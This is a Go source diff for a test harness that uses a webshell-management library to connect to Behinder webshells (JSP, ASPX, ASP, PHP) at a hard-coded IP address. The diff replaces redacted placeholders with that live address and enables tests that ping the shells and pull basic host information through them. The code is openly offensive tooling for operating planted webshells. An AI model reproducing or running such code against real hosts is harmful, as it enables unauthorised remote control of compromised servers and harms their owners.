@@ -10,17 +10,17 @@ import (
 
 const (
 	// JspIndexShellUrl 测试输出存在干扰字符的情况
-	JspIndexShellUrl = "http://***REMOVED***:8080/bxindex.jsp"
-	JspShellUrl      = "http://***REMOVED***:8080/bx.jsp"
-	CsharpShellUrl   = "http://***REMOVED***:8081/bx.aspx"
-	AspShellUrl      = "http://***REMOVED***:8081/bx.asp"
-	PhpShellUrl      = "http://***REMOVED***/bx.php"
+	JspIndexShellUrl = "http://139.196.175.86:8080/bxindex.jsp"
+	JspShellUrl      = "http://139.196.175.86:8080/bx.jsp"
+	CsharpShellUrl   = "http://139.196.175.86:8081/bx.aspx"
+	AspShellUrl      = "http://139.196.175.86:8081/bx.asp"
+	PhpShellUrl      = "http://139.196.175.86/bx.php"
 )
 
 func main() {
 	log.SetFlags(log.Lshortfile)
-	//log.Println("Jsp Index")
-	//testJspIndex()
+	log.Println("Jsp Index")
+	testJspIndex()
 	log.Println("Jsp")
 	testJsp()
 	//log.Println("Aspx")
@@ -41,7 +41,10 @@ func testPhp() {
 			Headers:  nil,
 		}}
 	bx := wsm.NewBehinder(info)
-	i := bx.Ping()
+	i, err := bx.Ping()
+	if err != nil {
+		log.Println(err)
+	}
 	fmt.Println(i)
 }
 
@@ -56,7 +59,10 @@ func testAsp() {
 		}}
 	bx := wsm.NewBehinder(info)
 
-	i := bx.Ping()
+	i, err := bx.Ping()
+	if err != nil {
+		log.Println(err)
+	}
 	fmt.Println(i)
 }
 
@@ -72,7 +78,10 @@ func testAspx() {
 	}
 	bx := wsm.NewBehinder(info)
 
-	i := bx.Ping()
+	i, err := bx.Ping()
+	if err != nil {
+		log.Println(err)
+	}
 	fmt.Println(i)
 }
 
@@ -86,20 +95,26 @@ func testJsp() {
 			Headers:  nil,
 		}}
 	bx := wsm.NewBehinder(info)
-	//p := &behinder.PingParams{
-	//	// response 结果不加密测试
-	//	OnlyJavaParams: behinder.OnlyJavaParams{ForcePrint: true, NotEncrypt: true},
-	//	Content:        "xxxxxxx",
-	//}
-	//i := bx.Ping(p)
-	//fmt.Println(i)
-	//z := &behinder.BasicInfoParams{
-	//	OnlyJavaParams: behinder.OnlyJavaParams{ForcePrint: true, NotEncrypt: true},
-	//	WhatEver:       "xxxxxxx",
-	//}
-	//b := bx.BasicInfo(z)
-	b := bx.BasicInfo()
-	fmt.Println(b.GetRaw())
+	p := &behinder.PingParams{
+		// response 结果不加密测试
+		OnlyJavaParams: behinder.OnlyJavaParams{ForcePrint: true, NotEncrypt: true},
+		Content:        "xxxxxxx",
+	}
+	i, err := bx.Ping(p)
+	if err != nil {
+		log.Println(err)
+	}
+	fmt.Println(i)
+	z := &behinder.BasicInfoParams{
+		OnlyJavaParams: behinder.OnlyJavaParams{ForcePrint: true, NotEncrypt: true},
+		WhatEver:       "xxxxxxx",
+	}
+	b, err := bx.BasicInfo(z)
+	//b,err := bx.BasicInfo()
+	if err != nil {
+		log.Println(err)
+	}
+	fmt.Println(b.ToMap())
 }
 
 func testJspIndex() {
@@ -122,12 +137,18 @@ func testJspIndex() {
 		OnlyJavaParams: behinder.OnlyJavaParams{ForcePrint: true, NotEncrypt: false},
 		Content:        "xxxxxxx",
 	}
-	i := bx.Ping(p)
+	i, err := bx.Ping(p)
+	if err != nil {
+		log.Println(err)
+	}
 	fmt.Println(i)
-	//z := &behinder.BasicInfoParams{
-	//	OnlyJavaParams: behinder.OnlyJavaParams{ForcePrint: true, NotEncrypt: true},
-	//	WhatEver:       "xxxxxxx",
-	//}
-	//b := bx.BasicInfo(z)
-	//fmt.Println(b)
+	z := &behinder.BasicInfoParams{
+		OnlyJavaParams: behinder.OnlyJavaParams{ForcePrint: true, NotEncrypt: true},
+		WhatEver:       "xxxxxxx",
+	}
+	b, err := bx.BasicInfo(z)
+	if err != nil {
+		log.Println(err)
+	}
+	fmt.Println(b.ToMap())
 }
